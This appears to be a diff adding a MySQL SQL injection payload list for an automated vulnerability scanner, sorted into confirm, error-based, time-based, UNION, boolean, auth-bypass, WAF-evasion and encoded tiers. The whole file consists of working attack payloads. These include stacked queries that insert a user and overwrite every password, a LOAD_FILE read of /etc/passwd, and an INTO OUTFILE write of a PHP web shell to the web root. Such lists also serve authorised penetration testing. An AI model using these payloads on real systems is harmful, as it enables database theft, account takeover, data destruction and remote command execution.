@@ -1,0 +1,72 @@
+# MySQL SQLi — Advanced payload tier (fired after canary confirms hot param)
+# First 2 are confirm tier; remaining are advanced tier.
+# Format: one payload per line. Lines starting with # are comments.
+
+# ── Confirm (first 2) ──────────────────────────────────────────────────────
+' OR SLEEP(5)--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
+
+# ── Advanced — error-based ─────────────────────────────────────────────────
+' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--
+' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--
+
+# ── Advanced — time-based variants ────────────────────────────────────────
+';SELECT SLEEP(5)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' OR (SELECT 1 FROM (SELECT SLEEP(5))x)='1
+1 AND EXP(~(SELECT * FROM (SELECT version())x))
+' AND SLEEP(5)='
+" AND SLEEP(5)="
+
+# ── Advanced — UNION-based ─────────────────────────────────────────────────
+' UNION SELECT null,null,@@version--
+' UNION SELECT null,user(),null--
+' UNION SELECT null,database(),null--
+' UNION SELECT null,@@datadir,null--
+' UNION SELECT null,table_name,null FROM information_schema.tables LIMIT 1--
+' UNION SELECT null,column_name,null FROM information_schema.columns LIMIT 1--
+
+# ── Advanced — boolean-based ───────────────────────────────────────────────
+' AND 1=1--
+' AND 1=2--
+' OR 1=1--
+' OR 1=1#
+' OR 'x'='x
+
+# ── Advanced — auth bypass ─────────────────────────────────────────────────
+admin'--
+admin'#
+
+# ── Advanced — WAF bypass variants ────────────────────────────────────────
+/**/OR/**/1=1--
+' /*!50000OR*/ '1'='1
+
+# ── Advanced — column count probe ─────────────────────────────────────────
+' ORDER BY 1--
+' ORDER BY 100--
+
+# ── URL-encoded variants ───────────────────────────────────────────────────
+%27+OR+SLEEP(5)--%20
+%27+AND+EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--%20
+%27+UNION+SELECT+null,user(),null--%20
+%2527+OR+SLEEP(5)--
+%27/**/OR/**/SLEEP(5)--%20
+# Mixed case
+' Or SlEeP(5)-- -
+' uNION sELECT nuLL,user(),nuLL-- -
+# Hex encoding
+0x27 OR SLEEP(5)-- -
+\x27 OR SLEEP(5)-- -
+# Function obfuscation
+' AND SLEEP(5/*comment*/)--
+' AND (SELECT 1 FROM (SELECT SLEEP(0x5))A)--
+# Inline version comment
+' /*!50000UNION*/ SELECT null,@@version,null--
+' /*!UNION*/ /*!SELECT*/ null,version(),null--
+# Stacked queries
+'; INSERT INTO users VALUES ('hacked','hacked')-- -
+'; UPDATE users SET password='hacked' WHERE 1=1-- -
+# Load file (requires FILE privilege)
+' UNION SELECT null,LOAD_FILE('/etc/passwd'),null--
+# Outfile write
+' UNION SELECT null,'<?php system($_GET[c]);?>',null INTO OUTFILE '/var/www/html/shell.php'--
